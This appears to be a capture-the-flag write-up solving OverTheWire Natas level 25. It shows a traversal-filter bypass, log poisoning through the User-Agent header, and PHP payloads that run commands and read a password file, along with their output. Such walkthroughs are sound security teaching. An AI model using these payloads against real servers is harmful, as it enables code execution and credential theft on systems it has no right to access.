## Level 25 ##

Looking at the source given to us, we control the `lang` parameter (e.g. `?lang=de` will switch the language to German). We should use this somehow get hold of the `natas_webpass` file - which means finding a way to make the `strstr` call evaluate to false.

{% highlight php %}
    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
{% endhighlight %}

Bypassing the traversal is rather easy - if your string is `....//bar`, the `str_replace` expression will result in `../bar`. Just to prove this out, you can trigger an error with `?lang=....//.`. So what next? `logRequest` looks interesting:

{% highlight php %}
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
{% endhighlight %}

It looks like we could technically have access to our own logs. E.g. if your session cookie is `PHPSESSID=nulnhkq2j9fkq5379sv4pd5n34` you can access it via `?lang=....//logs/natas25_nulnhkq2j9fkq5379sv4pd5n34.log`:

```
[28.08.2020 08::57:18] PostmanRuntime/7.26.3 "Directory traversal attempt! fixing request."
```

That's cool, but it doesn't get us the password. And it doesn't seem we have any way to control `$message` either. *However*, there's this odd looking `$_SERVER['HTTP_USER_AGENT']`. The `User-Agent` header is something we fully control and doesn't seem to be sanitised in any way. This will get written as part of the log and, being loaded with `include`, essentially means it will execute it as a php file. Does it mean we have command injection? Setting `User-Agent` to `<?php echo implode(",",scandir("."));?>` and reading the log gives us:

```
[28.08.2020 09::00:17] .,..,.htaccess,.htpasswd,index-source.html,index.php,index.php.tmpl,language,logs "Directory traversal attempt! fixing request."
```

Yay! We can now search for that elusive `natas_webpass` file using `<?php echo exec("find / -name natas_webpass");?>` - which tells us it's under `/etc`. Now I got stuck for a while there because I didn't realise this was a directory, not a file `>_<`. A quick `ls` reveals the file we need, and `<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>` takes care of the rest.
